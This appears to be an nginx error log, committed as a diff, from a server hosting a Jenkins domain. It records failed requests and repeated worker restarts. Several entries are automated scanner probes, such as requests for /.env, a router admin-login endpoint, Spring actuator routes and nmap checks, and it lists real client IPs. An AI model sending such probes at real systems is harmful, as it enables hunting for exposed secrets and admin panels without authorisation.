+2024/04/13 19:24:06 [error] 20#20: *160 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:24:06 [error] 19#19: *161 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:24:36 [error] 19#19: *162 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:24:37 [error] 19#19: *163 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.254.151.30, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 19:58:25 [error] 19#19: *164 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 217.128.113.195, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0", host: "61.14.234.55"
+2024/04/13 20:06:31 [error] 19#19: *165 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/13 20:42:49 [error] 19#19: *166 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.180.143.49, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 20:57:00 [error] 19#19: *167 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 107.170.237.54, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 20:58:57 [error] 19#19: *168 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 46.174.191.30, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/13 21:43:11 [error] 19#19: *177 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 103.114.106.107, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/13 21:43:11 [error] 19#19: *178 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 103.114.106.107, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 21:50:36 [error] 19#19: *185 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.150.26.246, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/13 21:57:31 [error] 19#19: *188 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.142.125.10, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/13 21:57:35 [error] 20#20: *189 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.142.125.10, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 21:59:52 [error] 20#20: *191 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 58.53.218.148, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 22:21:54 [error] 20#20: *212 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.95, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/13 22:23:24 [error] 20#20: *213 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/13 22:29:17 [error] 20#20: *214 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.94, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 22:49:25 [error] 20#20: *226 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.242.226.10, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 23:24:44 [error] 20#20: *227 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 5.235.242.123, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/13 23:24:48 [error] 20#20: *228 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 5.235.242.123, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/13 23:47:03 [error] 20#20: *229 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 58.53.218.148, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/13 23:54:32 [error] 20#20: *231 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 00:10:01 [error] 20#20: *232 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 206.72.198.135, server: jenkins.thanhtha.name.vn, request: "HEAD / HTTP/1.0"
+2024/04/14 00:24:41 [error] 20#20: *234 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 205.210.31.16, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/14 00:34:56 [error] 20#20: *235 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 01:06:51 [error] 20#20: *243 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.94, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 01:24:17 [error] 19#19: *244 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 34.78.249.41, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 01:29:52 [error] 19#19: *245 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 02:08:05 [error] 19#19: *261 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.95, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 02:08:08 [error] 19#19: *262 open() "/etc/nginx/html/druid/index.html" failed (2: No such file or directory), client: 162.243.129.11, server: jenkins.thanhtha.name.vn, request: "GET /druid/index.html HTTP/1.1", host: "61.14.234.55"
+2024/04/14 03:33:09 [error] 19#19: *3114 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.180.143.137, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 03:37:48 [error] 19#19: *3115 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 177.73.245.96, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 03:39:36 [error] 19#19: *3116 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 58.53.218.148, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 04:01:53 [error] 19#19: *3121 open() "/etc/nginx/html/portal/redlion" failed (2: No such file or directory), client: 138.68.208.37, server: jenkins.thanhtha.name.vn, request: "GET /portal/redlion HTTP/1.1", host: "61.14.234.55"
+2024/04/14 04:11:22 [error] 19#19: *3124 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.95, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 04:13:36 [error] 19#19: *3125 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.216.149.163, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 04:42:44 [error] 19#19: *3131 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.150.26.246, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 04:45:09 [error] 19#19: *3132 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 176.53.223.61, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "jenkins.thanhtha.name.vn"
+2024/04/14 04:45:10 [error] 19#19: *3133 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 89.104.101.249, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "jenkins.thanhtha.name.vn"
+2024/04/14 05:05:20 [error] 19#19: *3168 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 152.32.247.23, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 05:19:07 [error] 20#20: *3179 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.128.232.27, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80", referrer: "http://61.14.234.55:80/left.html"
+2024/04/14 05:22:39 [error] 20#20: *3180 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 05:32:02 [error] 20#20: *3181 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 05:34:25 [error] 20#20: *3182 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 118.194.251.37, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 05:34:25 [error] 20#20: *3183 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 118.194.251.37, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/14 05:34:25 [error] 20#20: *3184 open() "/etc/nginx/html/robots.txt" failed (2: No such file or directory), client: 118.194.251.37, server: jenkins.thanhtha.name.vn, request: "GET /robots.txt HTTP/1.1", host: "61.14.234.55"
+2024/04/14 05:34:25 [error] 20#20: *3185 open() "/etc/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 118.194.251.37, server: jenkins.thanhtha.name.vn, request: "GET /sitemap.xml HTTP/1.1", host: "61.14.234.55"
+2024/04/14 05:37:02 [error] 20#20: *3186 open() "/etc/nginx/html/actuator/health" failed (2: No such file or directory), client: 192.241.202.77, server: jenkins.thanhtha.name.vn, request: "GET /actuator/health HTTP/1.1", host: "61.14.234.55"
+2024/04/14 05:58:22 [error] 20#20: *3192 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.95, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 07:27:51 [error] 20#20: *3200 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.94, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 07:46:54 [error] 20#20: *3202 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 151.239.247.5, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 08:11:19 [error] 20#20: *3204 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 64.62.197.86, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 08:12:18 [error] 20#20: *3205 "/etc/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 64.62.197.82, server: jenkins.thanhtha.name.vn, request: "GET /webui/ HTTP/1.1", host: "61.14.234.55"
+2024/04/14 08:13:17 [error] 19#19: *3206 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 64.62.197.89, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/14 08:14:01 [error] 19#19: *3207 open() "/etc/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 45.77.174.123, server: jenkins.thanhtha.name.vn, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "61.14.234.55:80", referrer: "http://61.14.234.55:80/admin/login.asp"
+2024/04/14 08:14:02 [error] 19#19: *3208 "/etc/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 64.62.197.79, server: jenkins.thanhtha.name.vn, request: "GET /geoserver/web/ HTTP/1.1", host: "61.14.234.55"
+2024/04/14 08:34:38 [error] 19#19: *3209 open() "/etc/nginx/html/hudson" failed (2: No such file or directory), client: 192.241.219.29, server: jenkins.thanhtha.name.vn, request: "GET /hudson HTTP/1.1", host: "61.14.234.55"
+2024/04/14 08:38:14 [error] 19#19: *3210 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 09:06:14 [error] 19#19: *3211 open() "/etc/nginx/html/actuator/info" failed (2: No such file or directory), client: 45.128.232.229, server: jenkins.thanhtha.name.vn, request: "GET /actuator/info HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 09:36:00 [error] 19#19: *3214 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 10:01:47 [error] 19#19: *3238 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.150.26.246, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 10:14:02 [error] 19#19: *3249 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 78.40.106.9, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 10:25:23 [error] 19#19: *3250 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.94, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 10:29:49 [error] 19#19: *3253 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 10:39:02 [error] 19#19: *3254 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 11:03:47 [error] 19#19: *3259 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 85.239.241.22, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 11:26:02 [error] 19#19: *3261 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.196.10.155, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 11:27:18 [error] 20#20: *3262 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 95.172.60.186, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 11:41:09 [error] 20#20: *3338 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 83.97.73.245, server: jenkins.thanhtha.name.vn, request: "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 12:05:40 [error] 20#20: *3893 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 12:34:38 [error] 20#20: *4396 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 206.72.198.135, server: jenkins.thanhtha.name.vn, request: "HEAD / HTTP/1.0"
+2024/04/14 12:39:13 [error] 20#20: *4442 open() "/etc/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 103.177.35.175, server: jenkins.thanhtha.name.vn, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "61.14.234.55:80", referrer: "http://61.14.234.55:80/admin/login.asp"
+2024/04/14 12:50:42 [error] 20#20: *4693 open() "/etc/nginx/html/actuator/gateway/routes" failed (2: No such file or directory), client: 83.97.73.245, server: jenkins.thanhtha.name.vn, request: "GET /actuator/gateway/routes HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 12:53:49 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/14 12:53:49 [notice] 20#20: gracefully shutting down
+2024/04/14 12:53:49 [notice] 20#20: exiting
+2024/04/14 12:53:49 [notice] 20#20: exit
+2024/04/14 12:53:49 [notice] 19#19: gracefully shutting down
+2024/04/14 12:53:49 [notice] 19#19: exiting
+2024/04/14 12:53:49 [notice] 19#19: exit
+2024/04/14 12:53:49 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/14 12:53:49 [notice] 1#1: worker process 20 exited with code 0
+2024/04/14 12:53:49 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/14 12:53:49 [notice] 1#1: signal 17 (SIGCHLD) received from 19
+2024/04/14 12:53:49 [notice] 1#1: worker process 19 exited with code 0
+2024/04/14 12:53:49 [notice] 1#1: exit
+2024/04/14 12:53:52 [notice] 1#1: using the "epoll" event method
+2024/04/14 12:53:52 [notice] 1#1: nginx/1.25.4
+2024/04/14 12:53:52 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/14 12:53:52 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/14 12:53:52 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/14 12:53:52 [notice] 1#1: start worker processes
+2024/04/14 12:53:52 [notice] 1#1: start worker process 20
+2024/04/14 12:53:52 [notice] 1#1: start worker process 21
+2024/04/14 13:09:49 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/14 13:09:49 [notice] 21#21: gracefully shutting down
+2024/04/14 13:09:49 [notice] 21#21: exiting
+2024/04/14 13:09:49 [notice] 21#21: exit
+2024/04/14 13:09:49 [notice] 20#20: gracefully shutting down
+2024/04/14 13:09:49 [notice] 20#20: exiting
+2024/04/14 13:09:49 [notice] 20#20: exit
+2024/04/14 13:09:49 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/14 13:09:49 [notice] 1#1: worker process 21 exited with code 0
+2024/04/14 13:09:49 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/14 13:09:49 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/14 13:09:49 [notice] 1#1: worker process 20 exited with code 0
+2024/04/14 13:09:49 [notice] 1#1: exit
+2024/04/14 13:09:52 [notice] 1#1: using the "epoll" event method
+2024/04/14 13:09:52 [notice] 1#1: nginx/1.25.4
+2024/04/14 13:09:52 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/14 13:09:52 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/14 13:09:52 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/14 13:09:52 [notice] 1#1: start worker processes
+2024/04/14 13:09:52 [notice] 1#1: start worker process 20
+2024/04/14 13:09:52 [notice] 1#1: start worker process 21
+2024/04/14 14:04:33 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/14 14:04:33 [notice] 21#21: gracefully shutting down
+2024/04/14 14:04:33 [notice] 21#21: exiting
+2024/04/14 14:04:33 [notice] 20#20: gracefully shutting down
+2024/04/14 14:04:33 [notice] 20#20: exiting
+2024/04/14 14:04:33 [notice] 20#20: exit
+2024/04/14 14:04:33 [notice] 21#21: exit
+2024/04/14 14:04:33 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/14 14:04:33 [notice] 1#1: worker process 20 exited with code 0
+2024/04/14 14:04:33 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/14 14:04:33 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/14 14:04:33 [notice] 1#1: worker process 21 exited with code 0
+2024/04/14 14:04:33 [notice] 1#1: exit
+2024/04/14 14:04:53 [notice] 1#1: using the "epoll" event method
+2024/04/14 14:04:53 [notice] 1#1: nginx/1.25.4
+2024/04/14 14:04:53 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/14 14:04:53 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/14 14:04:53 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/14 14:04:53 [notice] 1#1: start worker processes
+2024/04/14 14:04:53 [notice] 1#1: start worker process 20
+2024/04/14 14:04:53 [notice] 1#1: start worker process 21
+2024/04/14 14:06:24 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/14 14:06:24 [notice] 20#20: gracefully shutting down
+2024/04/14 14:06:24 [notice] 21#21: gracefully shutting down
+2024/04/14 14:06:24 [notice] 20#20: exiting
+2024/04/14 14:06:24 [notice] 21#21: exiting
+2024/04/14 14:06:24 [notice] 21#21: exit
+2024/04/14 14:06:24 [notice] 20#20: exit
+2024/04/14 14:06:24 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/14 14:06:24 [notice] 1#1: worker process 20 exited with code 0
+2024/04/14 14:06:24 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/14 14:06:24 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/14 14:06:24 [notice] 1#1: worker process 21 exited with code 0
+2024/04/14 14:06:24 [notice] 1#1: exit
+2024/04/14 14:06:43 [notice] 1#1: using the "epoll" event method
+2024/04/14 14:06:43 [notice] 1#1: nginx/1.25.4
+2024/04/14 14:06:43 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/14 14:06:43 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/14 14:06:43 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/14 14:06:43 [notice] 1#1: start worker processes
+2024/04/14 14:06:43 [notice] 1#1: start worker process 20
+2024/04/14 14:06:43 [notice] 1#1: start worker process 21
+2024/04/14 14:09:09 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/14 14:09:09 [notice] 21#21: gracefully shutting down
+2024/04/14 14:09:09 [notice] 21#21: exiting
+2024/04/14 14:09:09 [notice] 21#21: exit
+2024/04/14 14:09:09 [notice] 20#20: gracefully shutting down
+2024/04/14 14:09:09 [notice] 20#20: exiting
+2024/04/14 14:09:09 [notice] 20#20: exit
+2024/04/14 14:09:09 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/14 14:09:09 [notice] 1#1: worker process 20 exited with code 0
+2024/04/14 14:09:09 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/14 14:09:09 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/14 14:09:09 [notice] 1#1: worker process 21 exited with code 0
+2024/04/14 14:09:09 [notice] 1#1: exit
+2024/04/14 14:11:58 [notice] 1#1: using the "epoll" event method
+2024/04/14 14:11:58 [notice] 1#1: nginx/1.25.4
+2024/04/14 14:11:58 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/14 14:11:58 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/14 14:11:58 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/14 14:11:58 [notice] 1#1: start worker processes
+2024/04/14 14:11:58 [notice] 1#1: start worker process 21
+2024/04/14 14:11:58 [notice] 1#1: start worker process 22
+2024/04/14 14:13:42 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/14 14:13:42 [notice] 22#22: gracefully shutting down
+2024/04/14 14:13:42 [notice] 21#21: gracefully shutting down
+2024/04/14 14:13:42 [notice] 22#22: exiting
+2024/04/14 14:13:42 [notice] 21#21: exiting
+2024/04/14 14:13:42 [notice] 22#22: exit
+2024/04/14 14:13:42 [notice] 21#21: exit
+2024/04/14 14:13:42 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2024/04/14 14:13:42 [notice] 1#1: worker process 22 exited with code 0
+2024/04/14 14:13:42 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/14 14:13:42 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/14 14:13:42 [notice] 1#1: worker process 21 exited with code 0
+2024/04/14 14:13:42 [notice] 1#1: exit
+2024/04/14 14:13:53 [notice] 1#1: using the "epoll" event method
+2024/04/14 14:13:53 [notice] 1#1: nginx/1.25.4
+2024/04/14 14:13:53 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/14 14:13:53 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/14 14:13:53 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/14 14:13:53 [notice] 1#1: start worker processes
+2024/04/14 14:13:53 [notice] 1#1: start worker process 20
+2024/04/14 14:13:53 [notice] 1#1: start worker process 21
+2024/04/14 14:20:47 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/04/14 14:20:47 [notice] 21#21: gracefully shutting down
+2024/04/14 14:20:47 [notice] 21#21: exiting
+2024/04/14 14:20:47 [notice] 21#21: exit
+2024/04/14 14:20:47 [notice] 20#20: gracefully shutting down
+2024/04/14 14:20:47 [notice] 20#20: exiting
+2024/04/14 14:20:47 [notice] 20#20: exit
+2024/04/14 14:20:47 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/04/14 14:20:47 [notice] 1#1: worker process 21 exited with code 0
+2024/04/14 14:20:47 [notice] 1#1: signal 29 (SIGIO) received
+2024/04/14 14:20:47 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/04/14 14:20:47 [notice] 1#1: worker process 20 exited with code 0
+2024/04/14 14:20:47 [notice] 1#1: exit
+2024/04/14 14:20:48 [notice] 1#1: using the "epoll" event method
+2024/04/14 14:20:48 [notice] 1#1: nginx/1.25.4
+2024/04/14 14:20:48 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
+2024/04/14 14:20:48 [notice] 1#1: OS: Linux 5.4.0-176-generic
+2024/04/14 14:20:48 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/04/14 14:20:48 [notice] 1#1: start worker processes
+2024/04/14 14:20:48 [notice] 1#1: start worker process 20
+2024/04/14 14:20:48 [notice] 1#1: start worker process 21
+2024/04/14 14:24:35 [error] 20#20: *219 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 15:30:52 [error] 20#20: *2266 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 85.239.241.22, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 15:32:25 [error] 20#20: *2267 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.120.230.94, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 16:22:52 [error] 20#20: *2272 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 198.74.56.46, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/14 16:37:09 [error] 20#20: *2290 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.196.10.155, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/14 16:43:39 [error] 20#20: *2294 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.152.52.53, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/14 16:43:46 [error] 20#20: *2299 open() "/etc/nginx/html/sdk" failed (2: No such file or directory), client: 104.152.52.53, server: jenkins.thanhtha.name.vn, request: "POST /sdk HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/14 16:43:46 [error] 20#20: *2301 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.152.52.53, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/14 16:43:46 [error] 20#20: *2298 open() "/etc/nginx/html/nmaplowercheck1713113026" failed (2: No such file or directory), client: 104.152.52.53, server: jenkins.thanhtha.name.vn, request: "GET /nmaplowercheck1713113026 HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/14 16:43:46 [error] 20#20: *2304 open() "/etc/nginx/html/HNAP1" failed (2: No such file or directory), client: 104.152.52.53, server: jenkins.thanhtha.name.vn, request: "GET /HNAP1 HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/14 16:43:46 [error] 20#20: *2305 open() "/etc/nginx/html/evox/about" failed (2: No such file or directory), client: 104.152.52.53, server: jenkins.thanhtha.name.vn, request: "GET /evox/about HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/14 16:43:49 [error] 20#20: *2310 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.152.52.53, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/14 16:43:49 [error] 20#20: *2313 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.152.52.53, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "no-ptr.123host.vn"
